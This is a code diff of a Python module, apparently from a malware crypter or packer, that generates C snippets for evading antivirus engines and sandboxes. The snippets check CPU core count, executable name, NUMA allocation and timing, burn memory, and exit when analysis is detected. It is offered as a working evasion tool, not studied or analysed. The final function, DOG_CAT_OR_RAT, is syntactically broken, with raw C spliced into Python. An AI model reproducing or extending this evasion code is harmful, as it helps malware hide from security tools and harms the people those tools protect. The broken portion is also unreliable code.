@@ -1,91 +1,267 @@
-from lib import body, gen, core
-
-
-# Step 1: Memory alloc 250Mb
-# Step 2: Wait 5 seconds
-# Step 3: Inject NULL octect
-# Step 4: Free Memory
-def Decoil():
-    print("""
- |------------------------------------------------------------|
- |HARD MEMORY ALLOCATION                                      |
- |------------------------------------------------------------|
- Please enter the number of decoil to add (unlimited).
- PS : 1 decoil = 1 secondes to sleep.
- Press ENTER for ignore this step.
-            """)
-
-    Number_Of_Decoil = core.core_input()
-    Transform_To_Int = int(Number_Of_Decoil)
-
-    Number_Of_Decoil = 0
-    Decoil_Code = ""
-
-    while Number_Of_Decoil != Transform_To_Int:
-
-        Number_Of_Decoil += 1
-        Memdmp1 = gen.Varname_Creator()
-        Tac1 = gen.Varname_Creator()
-        Tick1 = gen.Varname_Creator()
-
-        Decoil_Code += "char * " + Memdmp1 + "= NULL;"
-        Decoil_Code += Memdmp1 + " = (char *)malloc(300000000);"
-        Decoil_Code += "if (" + Memdmp1 + " != NULL) {"
-        Decoil_Code += "memset(" + Memdmp1 + ", 00, 300000000);}"
-        Decoil_Code += "int " + Tick1 + " = GetTickCount();"
-        Decoil_Code += "Sleep(1000);"
-        Decoil_Code += "int " + Tac1 + " = GetTickCount();"
-        Decoil_Code += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
-        Decoil_Code += "free(" + Memdmp1 + ");"
-
-    return Decoil_Code
-
+from lib import core
+import random
 
 
 # Add Anti-VM code
-def Anti_VM(FILENAME):
+def THE_GREAT_EVASION(FILENAME):
+    core.ADDING_EVASION()
 
-    Memdmp1 = gen.Varname_Creator()
-    Tac1 = gen.Varname_Creator()
-    Tick1 = gen.Varname_Creator()
-    AntiVM = "char * " + Memdmp1 + "= NULL;"
-    AntiVM += Memdmp1 + " = (char *)malloc(300000000);"
-    AntiVM += "if (" + Memdmp1 + " != NULL) {"
-    AntiVM += "memset(" + Memdmp1 + ", 00, 300000000);}"
-    AntiVM += "int " + Tick1 + " = GetTickCount();"
-    AntiVM += "Sleep(1000);"
-    AntiVM += "int " + Tac1 + " = GetTickCount();"
-    AntiVM += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
-    AntiVM += "free(" + Memdmp1 + ");"
+    EVASION = ""
+    EVASION += NUMBER_OF_CORE()
+    EVASION += MY_NAME_IS(FILENAME)
+    EVASION += MONO_CORE()
+    EVASION += HARD_USAGE()
 
-    # Check if "WindowsUpdate.log" exist
-    File_Exist = gen.Varname_Creator()
-    A = gen.Varname_Creator()
-    AntiVM += "FILE *" + File_Exist + ' = fopen("C:\\\WINDOWS\\\WindowsUpdate.log", "r");'
-    AntiVM += "if (" + File_Exist + " != 0){int " + A + " = 0;}"
-    AntiVM += "else exit(0);"
+    core.EVASION_ADDED()
 
+    return EVASION
+
+
+def NUMBER_OF_CORE():
+    # Check number of core
+    SYSGUIDE = core.VARNAME_CREATOR()
+    CORE = core.VARNAME_CREATOR()
+    EVASION = "SYSTEM_INFO " + SYSGUIDE + ";\n"
+    EVASION += "GetSystemInfo(&" + SYSGUIDE + ");\n"
+    EVASION += "int " + CORE + " = " + SYSGUIDE + ".dwNumberOfProcessors;\n"
+    EVASION += "if (" + CORE + " < 2){exit(0);}\n\n"
+
+    return EVASION
+
+
+def MY_NAME_IS(FILENAME):
     # Check if the begin name is the same
-    B = gen.Varname_Creator()
-    FILENAME = FILENAME.replace('.exe', '')
+    B = core.VARNAME_CREATOR()
     FILENAME = FILENAME.replace('output/', '')
-    AntiVM += 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}'
-    AntiVM += "else exit(0);"
+    EVASION = 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}\n'
+    EVASION += "else{exit(0);}\n\n"
 
-    # OPS
-    C = gen.Varname_Creator()
-    I = gen.Varname_Creator()
-    AntiVM += "int " + I + " = 0;"
-    AntiVM += "while(" + I + "<100000000){" + I + "++;}"
-    AntiVM += "if(" + I + ">99999990){int " + C + " = 0;}"
-    AntiVM += "else exit(0);"
-
-    return AntiVM
+    return EVASION
 
 
+def MONO_CORE():
+    # AV have no multiproc
+    MEM2 = core.VARNAME_CREATOR()
+    EVASION = "LPVOID " + MEM2 + "= NULL;\n"
+    EVASION += MEM2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
+    EVASION += "if (" + MEM2 + " != NULL){\n"
+    EVASION += 'printf("Hello World");}\n'
+    EVASION += "else{exit(0);}\n\n"
 
-#def Xor_Encryption:
+    return EVASION
 
 
+def HARD_USAGE():
+    # Fake cpu/mem operation
+    OP1 = core.VARNAME_CREATOR()
+    OP1_VALUE = str(random.randint(6000, 8000))
+    ITERATOR1 = core.VARNAME_CREATOR()
+    MEM1 = core.VARNAME_CREATOR()
+    MEM1_VALUE = str(random.randint(45000000, 60000000))
+    EVASION = "int " + OP1 + "= " + OP1_VALUE + ";\n"
+    EVASION += "int " + ITERATOR1 + " = 0;\n"
+    EVASION += "for (" + ITERATOR1 + " = 0; " + ITERATOR1 + " < " + OP1 + "; " + ITERATOR1 + "++){\n"
+    EVASION += 'printf("%d\\n", ' + ITERATOR1 + ');\n'
+    EVASION += "char * " + MEM1 + " = NULL;\n"
+    EVASION += MEM1 + " = (char * )malloc(" + MEM1_VALUE + ");\n"
+    EVASION += "if (" + MEM1 + " != NULL){\n"
+    EVASION += "memset(" + MEM1 + ", 00, " + MEM1_VALUE + ");\n"
+    EVASION += "free(" + MEM1 + ");}\n"
+    EVASION += "else{exit(0);}}\n"
+    EVASION += "if (" + ITERATOR1 + " != " + OP1 + "){\n"
+    EVASION += "exit(0);}\n\n"
 
-#def Xor_Decryption():
+    return EVASION
+
+def DOG_CAT_OR_RAT():
+    # back to first while :) EZ
+
+    MINIMUM_NUMBER = core.VARNAME_CREATOR()
+    MINIMUM_NUMBER_VALUE = str(random.randint(3000, 4000))
+
+    MAX_NUMBER = core.VARNAME_CREATOR()
+    MAX_NUMBER_VALUE = str(random.randint(5000, 6000))
+
+    EVASION = "int " + MINIMUM_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";"
+    EVASION += "int " + MAX_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";"
+    EVASION += "int count_0 = 0;
+    int
+    stock_0 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    count_1 = 0;
+    int
+    stock_1 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    count_2 = 0;
+    int
+    stock_2 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    count_3 = 0;
+    int
+    stock_3 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    count_4 = 0;
+    int
+    stock_4 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    count_5 = 0;
+    int
+    stock_5 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+    int
+    number_0;
+    int
+    number_1;
+    int
+    number_2;
+    int
+    number_3;
+    int
+    number_4;
+    int
+    number_5;
+
+    while (count_0 != stock_0)
+        {
+            count_0 + +;
+        int
+        number_0 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+        int
+        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+        char * mem_0 = NULL;
+        mem_0 = (char *)
+        malloc(amalloc);
+
+        if (mem_0 != NULL)
+        {
+        memset(mem_0, 00, amalloc);
+        free(mem_0);
+        }
+        else
+        {
+        exit(0);
+        }
+
+    while (count_1 != stock_1)
+        {
+            count_1 + +;
+        int
+        number_1 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+        int
+        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+        char * mem_1 = NULL;
+        mem_1 = (char *)
+        malloc(amalloc);
+
+        if (mem_1 != NULL)
+        {
+        memset(mem_1, 00, amalloc);
+        free(mem_1);
+        }
+        else
+        {
+        exit(0);
+        }
+
+        while (count_2 != stock_2)
+            {
+                count_2 + +;
+            int
+            number_2 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+            int
+            amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+            char * mem_2 = NULL;
+            mem_2 = (char *)
+            malloc(amalloc);
+
+            if (mem_2 != NULL)
+            {
+            memset(mem_2, 00, amalloc);
+            free(mem_2);
+            }
+            else
+            {
+            exit(0);
+            }
+
+            while (count_3 != stock_3)
+                {
+                    count_3 + +;
+                int
+                number_3 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+                int
+                amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+                char * mem_3 = NULL;
+                mem_3 = (char *)
+                malloc(amalloc);
+
+                if (mem_3 != NULL)
+                {
+                memset(mem_3, 00, amalloc);
+                free(mem_3);
+                }
+                else
+                {
+                exit(0);
+                }
+
+                while (count_4 != stock_4)
+                    {
+                        count_4 + +;
+                    int
+                    number_4 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+                    int
+                    amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+                    char * mem_4 = NULL;
+                    mem_4 = (char *)
+                    malloc(amalloc);
+
+                    if (mem_4 != NULL)
+                    {
+                    memset(mem_4, 00, amalloc);
+                    free(mem_4);
+                    }
+                    else
+                    {
+                    exit(0);
+                    }
+
+                    while (count_5 != stock_5)
+                        {
+                            count_5 + +;
+                        int
+                        number_5 = rand() % (MAX_NUMBER + 1 - MINIMUM_NUMBER) + MINIMUM_NUMBER;
+
+                        int
+                        amalloc = rand() % (2000000 + 1 - 10000000) + 10000000;
+                        char * mem_5 = NULL;
+                        mem_5 = (char *)
+                        malloc(amalloc);
+
+                        if (mem_5 != NULL)
+                        {
+                        memset(mem_5, 00, amalloc);
+                        free(mem_5);
+                        }
+                        else
+                        {
+                        exit(0);
+                        }
+
+                        }
+                    }
+                    }
+                    }
+                    }
+                    }
+                    }
